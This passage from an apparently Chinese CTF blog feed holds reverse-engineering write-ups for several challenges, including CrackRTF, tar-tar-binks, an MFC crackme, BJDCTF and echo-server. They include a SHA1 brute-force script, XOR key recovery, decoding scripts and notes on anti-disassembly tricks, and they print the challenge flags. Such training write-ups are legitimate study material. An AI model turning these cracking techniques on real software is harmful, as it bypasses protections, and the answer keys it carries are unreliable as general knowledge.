align="left">Identifier</th><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">CALG_SHA</td><td align="left">0x00008004</td><td align="left">SHA hashing algorithm. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider" target="_blank" rel="noopener">Microsoft Base Cryptographic Provider</a>.</td></tr><tr><td align="left">CALG_SHA1</td><td align="left">0x00008004</td><td align="left">Same as <strong>CALG_SHA</strong>. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider" target="_blank" rel="noopener">Microsoft Base Cryptographic Provider</a>.</td></tr></tbody></table><p><code>sha1</code>加密，对我们输入的6位纯数字和后面接上的字符串进行sha1加密然后直接进行字符串对比，知道是数字所以爆破非常简单</p><pre><code class="python">import hashlibflag2 = &#39;@DBApp&#39;for i in range(100000, 999999):    h2 = hashlib.sha1((str(i) + flag2).encode(&#39;utf-8&#39;))    flags = h2.hexdigest()    if &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot; == flags:        print(str(i) + flag2)        print(flags)</code></pre><p>输出得到第一部分的密码</p><pre><code>123321@DBApp6e32d0943418c2c33385bc35a1470250dd8923a9</code></pre><p>然后看一下下一部分加密</p><pre><code class="c++">void __cdecl FUN_00401040(BYTE *param_1,DWORD param_2,LPSTR param_3){  int iVar1;  undefined4 *puVar2;  undefined4 local_68 [16];  uint local_28;  CHAR local_24 [4];  byte local_20 [16];  DWORD local_10;  HCRYPTHASH local_c;  HCRYPTPROV local_8;  iVar1 = 0x19;  puVar2 = local_68;  while (iVar1 != 0) {    iVar1 = iVar1 + -1;    *puVar2 = 0xcccccccc;    puVar2 = puVar2 + 1;  }  CryptAcquireContextA(&amp;local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);  iVar1 = __chkesp();  if (iVar1 != 0) {    CryptCreateHash(local_8,0x8003,0,0,&amp;local_c);    iVar1 = __chkesp();    if (iVar1 == 0) {      CryptReleaseContext(local_8,0);      __chkesp();    }    else {      CryptHashData(local_c,param_1,param_2,0);      iVar1 = __chkesp();      if (iVar1 == 0) {        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      }      else {        CryptGetHashParam(local_c,2,local_20,&amp;local_10,0);        __chkesp();        *param_3 = &#39;\0&#39;;        local_28 = 0;        while (local_28 &lt; local_10) {          wsprintfA(local_24,&quot;%02X&quot;,(uint)local_20[local_28]);          __chkesp();          lstrcatA(param_3,local_24);          __chkesp();          local_28 = local_28 + 1;        }        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      }    }  }  local_8 = 0x4011c8;  __chkesp();  return;}</code></pre><p>和上面的加密几乎一样，但是这次是<code>0x8003</code>，再查一查</p><table><thead><tr><th align="left">Identifier</th><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">CALG_MD5</td><td align="left">0x00008003</td><td align="left">MD5 hashing algorithm. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider" target="_blank" rel="noopener">Microsoft Base Cryptographic Provider</a>.</td></tr></tbody></table><p><code>md5</code>加密，并且没有限定字符的范围，<del>下辈子都跑不出来</del></p><p>再往下面看，两层加密都通过之后</p><pre><code class="c++">void __cdecl FUN_004014d0(LPCSTR param_1){  int iVar1;  undefined4 *puVar2;  undefined4 local_64 [16];  undefined4 local_24;  LPCVOID local_20;  undefined4 local_1c;  DWORD local_18;  uint local_14;  HGLOBAL local_10;  HRSRC local_c;  HANDLE local_8;  iVar1 = 0x18;  puVar2 = local_64;  while (iVar1 != 0) {    iVar1 = iVar1 + -1;    *puVar2 = 0xcccccccc;    puVar2 = puVar2 + 1;  }  local_8 = (HANDLE)0x0;  local_c = (HRSRC)0x0;  local_10 = (HGLOBAL)0x0;  local_14 = 0;  local_18 = 0;  local_1c = 0;  local_20 = (LPCVOID)0x0;  local_24 = 0;  FindResourceA((HMODULE)0x0,(LPCSTR)0x65,&quot;AAA&quot;);  local_c = (HRSRC)__chkesp();  if (local_c != (HRSRC)0x0) {    SizeofResource((HMODULE)0x0,local_c);    local_14 = __chkesp();    LoadResource((HMODULE)0x0,local_c);    local_10 = (HGLOBAL)__chkesp();    if (local_10 != (HGLOBAL)0x0) {      LockResource(local_10);      local_20 = (LPCVOID)__chkesp();      thunk_FUN_00401420(param_1,(int)local_20,local_14);      CreateFileA(&quot;dbapp.rtf&quot;,0x10000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);      local_8 = (HANDLE)__chkesp();      if (local_8 != (HANDLE)0xffffffff) {        WriteFile(local_8,local_20,local_14,&amp;local_18,(LPOVERLAPPED)0x0);        iVar1 = __chkesp();        if (iVar1 != 0) {          CloseHandle(local_8);          __chkesp();        }      }    }  }  local_8 = (HANDLE)0x40162d;  __chkesp();  return;}</code></pre><p>写了一个<code>dbapp.rtf</code>，写入的内容在上面一个函数</p><pre><code class="c++">void __cdecl FUN_00401420(LPCSTR param_1,int param_2,uint param_3){  uint uVar1;  int iVar2;  undefined4 *puVar3;  undefined4 local_50 [16];  uint local_10;  LPCSTR local_c;  undefined4 local_8;  iVar2 = 0x13;  puVar3 = local_50;  while (iVar2 != 0) {    iVar2 = iVar2 + -1;    *puVar3 = 0xcccccccc;    puVar3 = puVar3 + 1;  }  lstrlenA(param_1);  uVar1 = __chkesp();  local_c = param_1;  local_10 = 0;  while (local_10 &lt; param_3) {    *(byte *)(param_2 + local_10) = *(byte *)(param_2 + local_10) ^ param_1[local_10 % uVar1];    local_10 = local_10 + 1;  }  local_8 = 0x4014a3;  __chkesp();  return;}</code></pre><p>发现前面不知从哪里获取了一些内容，然后和我们输入的密码进行了一个循环异或，写入一个<code>rtf</code>文件</p><p>这里有一个点就是<code>rtf</code>文件的文件头是固定的6个字符，可以通过这里来算出来输入的第二次密码是什么</p><p>可以用<code>ResourceHacker</code>看一下<code>AAA</code>到底是什么</p><p><img src="/2020/03/27/CrackRTF-buuctf/AAA.png" srcset="/img/loading.gif" alt="AAA"></p><p>然后异或一下出来密码</p><pre><code class="python">s = &quot;{\\rtf1&quot;a = [0x05,0x7D,0x41,0x15,0x26,0x01]flag = &quot;&quot;for i in range(0,len(s)):    x = ord(s[i]) ^ a[i]    flag += chr(x)print(flag)</code></pre><p>得到第二个密码<code>~!3a@0</code></p><p>两个都通过后会生成一个<code>rtf</code>文件，内容是<code>flag</code></p><pre><code>Flag{N0_M0re_Free_Bugs}</code></pre><p>但是提交的时候要交小写的<code>flag</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tar-tar-binks-攻防世界</title>
    <link href="/2020/03/25/tar-tar-binks-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2020/03/25/tar-tar-binks-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<p>IDA打开发现函数很多，发现一个函数<code>base64_encode</code>，尝试对损坏的tar文件里面的部分进行base64解码，找到一串奇怪的字符</p><pre><code>F5D1,4D6B,ED6A,08A6,38DD,F7FA,609E,EBC4,E55F,E6D1,7C89,ED5B,0871,1A69,5D58,72DE,224B,3AA6,0845,7DD6,58FB,E9CC,0A2D,76B8,ED60,251A,1F6B,32CC,E78D,12FA,201A,E889,2D25,922A,4BC5,F5FF,F8E5,C79B,3A77,4BDB,EA11,5941,58BD,3A95,F5C9,A225,AD40,F8BD,095D,70B6,458C,E7A9,EA68,252F,094B,5E41,0969,6015,5ED5,F6E5,59B9,7CAF,66DF,265B,7837,57B4,7CAF,AED9,F707,6A3C,F8E5,F509,7C8B,0915,2235,336F,33E9,2D14,7C91,5804,83E5,E78D,F4EA,0874,ED6B,4B35,E839,57B4,E77C,EA68,2525,AD41,ED6F,3A4A,4BCC,6015,F440,0858,3AA6,7809,671D,0874,EA77,63AF,2E91,5845,F6C4,086D,7795,3939,57B4,7C89,82DC,32ED,B994,C7AF,9135,0E65,1B66,ED5B,3235,6577,5A80,3AD3,E776,1EE5,AD41,ED59,864C,70B4,3876,ED67,64D6,F8E5,F505,EAD9,7C9C,32ED,B994,B4EF,0C6C,F665,F5F5,9047,521A,E99E,EA68,252F,9D09,76B7,E776,1ED0,095D,0D4D,5D5A,087B,2005,1526,7E76,85AD,78B9,E8B6,782C,251C,32ED,7F68,EBE3,EA41,57FD,ED59,846D,7A05,B994,BB78,ED6A,08A6,38DD,3B5D,7E45,E839,738C,E9CC,0A2D,764A,609E,E8B6,EA68,2524,E6BB,7C9C,639F,3A95,0895,F40F,8328,EA69,7EE5,F8BD,7F7D,0D6D,70B6,458C,E8B6,EA68,251C,6065,B35F,C789,5845,7F7D,6D89,4C6E,A20E,60B5,7E45,ED59,F707,69EF,922A,4BC5,F6EF,8635,F4B9,57B4,7CF8,ED60,2510,095D,20AF,3545,F40F,8328,EA41,58A4,225D,7E7C,4BDB,F8BD,082C,EAE7,5D57,5D50,0914,E7C7,8624,7CF8,ED60,2511,7C8E,7159,8416,7EF9,E7E5,774A,3895,1EC9,7C90,09B9,58BD,5FF5,E99E,EA68,250A,224C,EA3D,73F5,7C89,53A6,3190,3B5D,1526,7DD5,666A,0919,225F,CDEF,79E1,7E7B,7E6B,082C,A277,E885,E8BB,E775,5FF7,EA68,251B,7FDF,589D,7A05,779A,8A5A,7C91,5D5C,32ED,F628,2195,F49A,0C77,EAE1,59B9,58BD,E570,E99E,EA3D,73F9,13AD,2BF5,225D,7F7D,70B6,4A9C,337A,1EC9,4D05,7E75,2578,ED59,38E5,1ECA,A210,3B5D,779A,8A6F,C790,2518,4B41,7C89,5D49,4D05,152D,73C5,79F9,4BED,913C,37C9,5D4D,53C8,0941,7C97,5D5B,346A,82D8,5F36,801F,C800,</code></pre><p>最后的一个<code>,</code>很可疑，应该是输出的时候按照固定格式输出的，所以搜索一下字符串</p><p><img src="https://s1.ax1x.com/2020/03/25/8jEkqS.png" srcset="/img/loading.gif" alt="tar-tar-binks"></p><p>找到可疑的<code>%04X</code>，查一下交叉引用</p><pre><code class="c++"> v10 = (char *)malloc(0x2710uLL);  __memcpy_chk(v10, a2, v18, -1LL);  if ( v18 &gt; 0x200 )  {    sub_1023457(v10, v18);    v9 = (char *)malloc(0x2710uLL);    __memset_chk(v10, 0LL, 10000LL, -1LL);    v8 = 0;    __memset_chk(v9, 0LL, 10000LL, -1LL);    while ( v8 &lt; posi )    {      v3 = strlen(v9);      __sprintf_chk(&amp;v9[v3], 0, 0xFFFFFFFFFFFFFFFFLL, &quot;%04X,&quot;, sub_101[v8++]);    }    __memcpy_chk(v10, v9, v18, -1LL);  }</code></pre><p>只有在这一处引用了，输出出来的奇怪的16进制数应该是<code>sub_101</code>里面的数，再查看一下<code>sub_101</code>的交叉引用</p><pre><code class="c++">unsigned int *__fastcall sub_1023458(_DWORD *a1){  unsigned int *result; // rax  int v2; // ST04_4  int v3; // esi  result = sub_101;  v2 = *a1 + 40 * a1[1] + 1600 * a1[2];  v3 = posi++;  sub_101[v3] = v2;  return result;}</code></pre><p>在这里进行了计算并写入，再一次查看交叉引用看看<code>a1</code>是什么</p><pre><code class="c++">__int64 __fastcall sub_1023457(char *a1, int a2){  int v2; // eax  char *v3; // rax  int v5; // [rsp+4h] [rbp-2Ch]  signed int v6; // [rsp+8h] [rbp-28h]  int v7; // [rsp+Ch] [rbp-24h]  char *v8; // [rsp+10h] [rbp-20h]  int v9[3]; // [rsp+1Ch] [rbp-14h]  v8 = a1;  v7 = a2;  v6 = 3;  while ( 1 )  {    v2 = v7--;    if ( !v2 )      break;    v3 = v8++;    v5 = *v3;    pending = 1;    while ( pending )    {      v9[--v6] = sub_1023456(v5);      if ( !v6 )      {        sub_1023458(v9);        v6 = 3;      }    }  }  if ( v6 != 3 )  {    while ( v6 != -1 )      v9[--v6] = 0;    sub_1023458(v9);  }  return __stack_chk_guard;}</code></pre><p><code>v9</code>每三位进行上面函数的操作，所以看看<code>v9</code>是怎么得到的</p><pre><code class="c++">__int64 __fastcall sub_1023456(int a1){  int v1; // ST04_4  int i; // [rsp+0h] [rbp-Ch]  int v4; // [rsp+4h] [rbp-8h]  unsigned int v5; // [rsp+8h] [rbp-4h]  v4 = a1;  if ( sub_1023456_shifted == -1 )  {    if ( a1 == 126 )      v4 = 0;    for ( i = 0; i &lt; 39; ++i )    {      if ( ctable[i] == v4 )      {        pending = 0;        return (unsigned int)i;      }      if ( ctable[i + 39] == v4 )      {        pending = 1;        sub_1023456_shifted = i;        return 39;      }    }    pending = 0;    v5 = 37;  }  else  {    v1 = sub_1023456_shifted;    sub_1023456_shifted = -1;    pending = 0;    v5 = v1;  }  return v5;}</code></pre><p>有一个字母表<code>ctable</code>，找到其中的索引，39以下直接返回索引值，39往上返回值分为两部分，一部分是39，另一部分是索引值<code>i</code>，之所以这么做其实是为了降低难度，使前面的三元一次方程有唯一解，把整个过程逆过来就得到了真正的<code>flag.txt</code></p><p><del>这里用来批评攻防世界，题目明明有说明最后使md5值怎么到这就没了</del></p><pre><code class="python">target = [0xF5D1, 0x4D6B, 0xED6A, 0x08A6, 0x38DD, 0xF7FA, 0x609E, 0xEBC4, 0xE55F, 0xE6D1, 0x7C89, 0xED5B, 0x0871,          0x1A69, 0x5D58, 0x72DE, 0x224B, 0x3AA6, 0x0845, 0x7DD6, 0x58FB, 0xE9CC, 0x0A2D, 0x76B8, 0xED60, 0x251A,          0x1F6B, 0x32CC, 0xE78D, 0x12FA, 0x201A, 0xE889, 0x2D25, 0x922A, 0x4BC5, 0xF5FF, 0xF8E5, 0xC79B, 0x3A77,          0x4BDB, 0xEA11, 0x5941, 0x58BD, 0x3A95, 0xF5C9, 0xA225, 0xAD40, 0xF8BD, 0x095D, 0x70B6, 0x458C, 0xE7A9,          0xEA68, 0x252F, 0x094B, 0x5E41, 0x0969, 0x6015, 0x5ED5, 0xF6E5, 0x59B9, 0x7CAF, 0x66DF, 0x265B, 0x7837,          0x57B4, 0x7CAF, 0xAED9, 0xF707, 0x6A3C, 0xF8E5, 0xF509, 0x7C8B, 0x0915, 0x2235, 0x336F, 0x33E9, 0x2D14,          0x7C91, 0x5804, 0x83E5, 0xE78D, 0xF4EA, 0x0874, 0xED6B, 0x4B35, 0xE839, 0x57B4, 0xE77C, 0xEA68, 0x2525,          0xAD41, 0xED6F, 0x3A4A, 0x4BCC, 0x6015, 0xF440, 0x0858, 0x3AA6, 0x7809, 0x671D, 0x0874, 0xEA77, 0x63AF,          0x2E91, 0x5845, 0xF6C4, 0x086D, 0x7795, 0x3939, 0x57B4, 0x7C89, 0x82DC, 0x32ED, 0xB994, 0xC7AF, 0x9135,          0x0E65, 0x1B66, 0xED5B, 0x3235, 0x6577, 0x5A80, 0x3AD3, 0xE776, 0x1EE5, 0xAD41, 0xED59, 0x864C, 0x70B4,          0x3876, 0xED67, 0x64D6, 0xF8E5, 0xF505, 0xEAD9, 0x7C9C, 0x32ED, 0xB994, 0xB4EF, 0x0C6C, 0xF665, 0xF5F5,          0x9047, 0x521A, 0xE99E, 0xEA68, 0x252F, 0x9D09, 0x76B7, 0xE776, 0x1ED0, 0x095D, 0x0D4D, 0x5D5A, 0x087B,          0x2005, 0x1526, 0x7E76, 0x85AD, 0x78B9, 0xE8B6, 0x782C, 0x251C, 0x32ED, 0x7F68, 0xEBE3, 0xEA41, 0x57FD,          0xED59, 0x846D, 0x7A05, 0xB994, 0xBB78, 0xED6A, 0x08A6, 0x38DD, 0x3B5D, 0x7E45, 0xE839, 0x738C, 0xE9CC,          0x0A2D, 0x764A, 0x609E, 0xE8B6, 0xEA68, 0x2524, 0xE6BB, 0x7C9C, 0x639F, 0x3A95, 0x0895, 0xF40F, 0x8328,          0xEA69, 0x7EE5, 0xF8BD, 0x7F7D, 0x0D6D, 0x70B6, 0x458C, 0xE8B6, 0xEA68, 0x251C, 0x6065, 0xB35F, 0xC789,          0x5845, 0x7F7D, 0x6D89, 0x4C6E, 0xA20E, 0x60B5, 0x7E45, 0xED59, 0xF707, 0x69EF, 0x922A, 0x4BC5, 0xF6EF,          0x8635, 0xF4B9, 0x57B4, 0x7CF8, 0xED60, 0x2510, 0x095D, 0x20AF, 0x3545, 0xF40F, 0x8328, 0xEA41, 0x58A4,          0x225D, 0x7E7C, 0x4BDB, 0xF8BD, 0x082C, 0xEAE7, 0x5D57, 0x5D50, 0x0914, 0xE7C7, 0x8624, 0x7CF8, 0xED60,          0x2511, 0x7C8E, 0x7159, 0x8416, 0x7EF9, 0xE7E5, 0x774A, 0x3895, 0x1EC9, 0x7C90, 0x09B9, 0x58BD, 0x5FF5,          0xE99E, 0xEA68, 0x250A, 0x224C, 0xEA3D, 0x73F5, 0x7C89, 0x53A6, 0x3190, 0x3B5D, 0x1526, 0x7DD5, 0x666A,          0x0919, 0x225F, 0xCDEF, 0x79E1, 0x7E7B, 0x7E6B, 0x082C, 0xA277, 0xE885, 0xE8BB, 0xE775, 0x5FF7, 0xEA68,          0x251B, 0x7FDF, 0x589D, 0x7A05, 0x779A, 0x8A5A, 0x7C91, 0x5D5C, 0x32ED, 0xF628, 0x2195, 0xF49A, 0x0C77,          0xEAE1, 0x59B9, 0x58BD, 0xE570, 0xE99E, 0xEA3D, 0x73F9, 0x13AD, 0x2BF5, 0x225D, 0x7F7D, 0x70B6, 0x4A9C,          0x337A, 0x1EC9, 0x4D05, 0x7E75, 0x2578, 0xED59, 0x38E5, 0x1ECA, 0xA210, 0x3B5D, 0x779A, 0x8A6F, 0xC790,          0x2518, 0x4B41, 0x7C89, 0x5D49, 0x4D05, 0x152D, 0x73C5, 0x79F9, 0x4BED, 0x913C, 0x37C9, 0x5D4D, 0x53C8,          0x0941, 0x7C97, 0x5D5B, 0x346A, 0x82D8, 0x5F36, 0x801F, 0xC800]ctable = [    0x00, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,    0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73,    0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32,    0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x20, 0x0A, 0x00,    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,    0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54,    0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x28, 0x21, 0x40, 0x23,    0x2C, 0x2E, 0x3F, 0x2F, 0x2A, 0x29, 0x3C, 0x3E, 0x00]t1 = []t2 = []for i in target:    c = i % 40    b = ((i - c) % 1600) // 40    a = i // 1600    t1 += [a, b, c]i = 0while i &lt; len(t1):    if t1[i] == 39:        t2 += [t1[i] + t1[i + 1]]        i += 2    else:        t2 += [t1[i]]        i += 1flag = &#39;&#39;for i in t2:    if ctable[i] != 0x00:        flag += chr(ctable[i])print(flag)</code></pre><p>输出的内容为</p><pre><code>Milos Raonic (born 1990) is a Canadian professional tennis player. He reached a career high world No. 4 singles ranking in May 2015, as ranked by the Association of Tennis Professionals (ATP). His career highlights include a Grand Slam final at the 2016 Wimbledon Championships and two Grand Slam semifinals at the 2014 Wimbledon Championships and 2016 Australian Open. He was the 2011 ATP Newcomer of the Year, and has been ranked continuously inside the top 20 since August 2012. Raonic is the first player born in the 1990s to win an ATP title, to be ranked in the top 10, and to qualify for the ATP World Tour Finals. He has eight ATP singles titles, all won on hard courts. He is frequently described as having one of the best serves among his contemporaries. Statistically, he is among the strongest servers in the Open Era, winning 91p of service games to rank third all time. Aided by his serve, he plays an all court style with an emphasis on short points.</code></pre><p>找到原题发现是求<code>md5</code>，然后发现求<code>md5</code>还求出来好几个……</p><p>正确的那一个</p><pre><code class="bash">-&gt; python3 common.py | md5sum2c8cd31daeba8753815851f13e6370b3  -</code></pre><p><del>这种时候应该找出题人py一个flag</del></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mfc逆向-200_攻防世界</title>
    <link href="/2020/03/24/mfc%E9%80%86%E5%90%91-200-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2020/03/24/mfc%E9%80%86%E5%90%91-200-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<p>这题就是一个脑洞题，但可以大概的了解一下windows编程</p><a id="more"></a><p>查壳发现是虚拟机<br><img src="https://s1.ax1x.com/2020/03/24/8b4mz4.png" srcset="/img/loading.gif" alt="8b4mz4.png"></p><p>IDA打开，脱壳怕是不可能的了，只能换其他方法。</p><p><del>这里用面向大佬博客做题法</del></p><p>因为<strong>Flag就在控件里</strong>，干脆spy++查看一下</p><p><img src="https://s1.ax1x.com/2020/03/24/8b4uQJ.png" srcset="/img/loading.gif" alt="8b4uQJ.png"></p><p>找到句柄，用xspy查一查</p><pre><code>OnMsg:0464,func= 0x00402170(mfc逆向-200.exe+ 0x002170 )</code></pre><p>找到了一个奇怪的东西，但是接下来不知道该怎么做了</p><p><del>然后偷瞄大佬博客</del></p><p>大佬掐指一算应该发个消息，vs启动</p><pre><code class="c++">#include &lt;iostream&gt;#include&lt;Windows.h&gt;int main(){    HWND h = FindWindowA(NULL, &quot;Flag就在控件里&quot;);    if (h)    {        SendMessage(h, 0x464, NULL, NULL);    }    return 0;}</code></pre><p>这里只是简单的用到了两个函数</p><p>第一个<code>FindWindowA</code>，定义如下</p><pre><code class="c++">HWND FindWindowA(  LPCSTR lpClassName,  {窗口的类名，可为空}  LPCSTR lpWindowName  {窗口的标题名});</code></pre><p>这个函数不查找子窗口（<code>FindWindowEx</code>），返回的是这个窗口的句柄，其实就是我们之前用spy++查询到的句柄，也可以用下面的代码</p><pre><code class="c++">auto h = HWND(0xa505f4);</code></pre><p>作用是一样的，找到句柄之后就可以发消息，用到了<code>SendMessage</code></p><p>定义如下</p><pre><code class="c++">LRESULT SendMessage（HWND hWnd，UINT Msg，WPARAM wParam，LPARAM IParam）</code></pre><blockquote><p>参数<br>hWnd：指定要接收消息的窗口的句柄。如果此参数为HWND_BROADCAST，则消息将被发送到系统中所有顶层窗口，包括无效或不可见的非自身拥有的窗口、被覆盖的窗口和弹出式窗口，但消息不被发送到子窗口。<br>Msg：指定被发送的消息。<br>wParam：指定附加的消息特定信息。<br>IParam：指定附加的消息特定信息。<br>返回值：返回值指定消息处理的结果，依赖于所发送的消息。</p></blockquote><p>所以给这个控件发个<code>0x464</code>，然后窗体里面的内容变了，变成了<code>{I am a Des key}</code></p><p>有了key，但是密文是什么……</p><p>大佬掐指一算，之前这个控件有个奇怪的类名<code>944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b</code></p><p>解密得到flag</p><pre><code>thIs_Is_real_kEy_hahaaa</code></pre><hr><p><del>不仅懂得比大佬少，脑洞也比不过大佬</del></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
      <tag>mfc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF-re-wp</title>
    <link href="/2020/03/21/BJDCTF-re-wp/"/>
    <url>/2020/03/21/BJDCTF-re-wp/</url>
    
    <content type="html"><![CDATA[<p><del>这么长时间就出了两道这么简单的re出题人的良心不会痛吗</del></p><p>re选手做完两道题结束比赛……</p><p>本来还想做做pwn，有时间再说吧</p><a id="more"></a><h4 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h4><p>随机数用时间种子初始化过了，猜是猜不对的，而且猜对了也没用，会输出flag不在这里，但是可以直接用IDA直接找到flag……</p><pre><code>BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</code></pre><h4 id="reverse-8086-ASM-DreamerJack"><a href="#reverse-8086-ASM-DreamerJack" class="headerlink" title="reverse-8086_ASM-DreamerJack"></a>reverse-8086_ASM-DreamerJack</h4><p>16位DOS……</p><p>IDA打开，发现一段数据很奇怪，转换成code</p><pre><code class="asm">mov     cx, 22h ; &#39;&quot;&#39;seg001:0005                 lea     bx, aUDuTZWjQGjzZWz ; &quot;]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;&quot;seg001:0009seg001:0009 loc_10039:                              ; CODE XREF: seg001:000F↓jseg001:0009                 mov     di, cxseg001:000B                 dec     diseg001:000C                 xor     byte ptr [bx+di], 1Fhseg001:000F                 loop    loc_10039seg001:0011                 lea     dx, aUDuTZWjQGjzZWz ; &quot;]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;&quot;seg001:0015                 mov     ah, 9seg001:0017                 int     21h             ; DOS - PRINT STRINGseg001:0017                                         ; DS:DX -&gt; string terminated by &quot;$&quot;seg001:0019                 retn</code></pre><p>异或，循环，输出……</p><p>跑一下</p><pre><code class="python">target = [0x5D, 0x55, 0x5B, 0x64, 0x75, 0x7E, 0x7C, 0x74, 0x40, 0x7B, 0x7A, 0x40, 0x77, 0x6A, 0x2E, 0x7D, 0x2E, 0x7E,          0x71, 0x40, 0x67, 0x6A, 0x7A, 0x7B, 0x7A, 0x40, 0x77, 0x7A, 0x71, 0x57, 0x7E, 0x2F, 0x62, 0x3B]flag = &#39;&#39;for i in range(0x22):    flag += chr(target[i] ^ 0x1F)print(flag)</code></pre><p>输出flag，其中<strong><code>$</code>是DOS终止符</strong></p><pre><code>BJD{jack_de_hu1b1an_xuede_henHa0}$</code></pre><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>溜了，<del>刷攻防世界去了</del></p><p>补作业去了</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>BJDCTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界_echo-server_wp</title>
    <link href="/2020/03/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-server-wp/"/>
    <url>/2020/03/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-server-wp/</url>
    
    <content type="html"><![CDATA[<p>这题涉及到去花和patch，难度不是很大</p><a id="more"></a><p>先file查看一下文件，32位ELF，运行一下</p><pre><code>               **************               Echo Server 0.3 ALPHA               **************</code></pre><p>等待输入，随便输入一句</p><pre><code>hhh686868</code></pre><p>直接返回了ASCII码值</p><p>用IDA打开看看</p><pre><code class="c++">int __cdecl main(){  setbuf(stdin, 0);  setbuf(stdout, 0);  dword_804A088 = 1;  puts(&quot;               **************\n               Echo Server 0.3 ALPHA\n               **************&quot;);  ((void (*)(void))((char *)&amp;loc_80487C1 + 3))();  return 0;}</code></pre><p><code>main</code>函数没什么特别的，就是最后这个函数调用很古怪，所以进去看看</p><pre><code class="c++">void __cdecl sub_804875D(unsigned __int8 *a1, unsigned int a2){  unsigned __int8 *v2; // eax  char v3; // zf  unsigned __int8 *v4; // [esp+18h] [ebp-10h]  unsigned int i; // [esp+1Ch] [ebp-Ch]  v4 = a1;  if ( a1 )  {    for ( i = 0; i &lt; a2; ++i )    {      v2 = v4++;      printf(&quot;%02X&quot;, *v2);    }  }  else  {    printf(&quot;NULL&quot;);  }  putchar(10);  JUMPOUT(v3, (char *)&amp;loc_80487C1 + 1);  JUMPOUT(!v3, (char *)&amp;loc_80487C1 + 1);  MEMORY[0x915A4B8F]();  JUMPOUT(loc_80487C6);}</code></pre><p>出现了访问内存越界的情况<code>MEMORY[0x915A4B8F]()</code>，看到上面两句更加古怪</p><pre><code class="c++">JUMPOUT(v3, (char *)&amp;loc_80487C1 + 1);JUMPOUT(!v3, (char *)&amp;loc_80487C1 + 1);</code></pre><p>这里很明显是强行创造多条分支，IDA使用递归行进算法，就会默认这条路径接这两个函数执行过后的指令是有效的而去扫描分析后面的指令，但实际上，后面是永远不会到达的指令，不管v3的值是多少，都会跳转到<code>(char *)&amp;loc_80487C1 + 1</code>这显然是一条花指令，所以查看一下汇编代码准备去花</p><pre><code class="asm">.text:0804875D ; Attributes: bp-based frame.text:0804875D.text:0804875D sub_804875D     proc near.text:0804875D.text:0804875D var_10          = dword ptr -10h.text:0804875D var_C           = dword ptr -0Ch.text:0804875D arg_0           = dword ptr  8.text:0804875D arg_4           = dword ptr  0Ch.text:0804875D.text:0804875D ; __unwind {.text:0804875D                 push    ebp.text:0804875E                 mov     ebp, esp.text:08048760                 sub     esp, 28h.text:08048763                 mov     eax, [ebp+arg_0].text:08048766                 mov     [ebp+var_10], eax.text:08048769                 cmp     [ebp+arg_0], 0.text:0804876D                 jnz     short loc_804877D.text:0804876F                 mov     dword ptr [esp], offset format ; &quot;NULL&quot;.text:08048776                 call    _printf.text:0804877B                 jmp     short loc_80487B1.text:0804877D ; ---------------------------------------------------------------------------.text:0804877D.text:0804877D loc_804877D:                            ; CODE XREF: sub_804875D+10↑j.text:0804877D                 mov     [ebp+var_C], 0.text:08048784                 jmp     short loc_80487A9.text:08048786 ; ---------------------------------------------------------------------------.text:08048786.text:08048786 loc_8048786:                            ; CODE XREF: sub_804875D+52↓j.text:08048786                 mov     eax, [ebp+var_10].text:08048789                 lea     edx, [eax+1].text:0804878C                 mov     [ebp+var_10], edx.text:0804878F                 movzx   eax, byte ptr [eax].text:08048792                 movzx   eax, al.text:08048795                 mov     [esp+4], eax.text:08048799           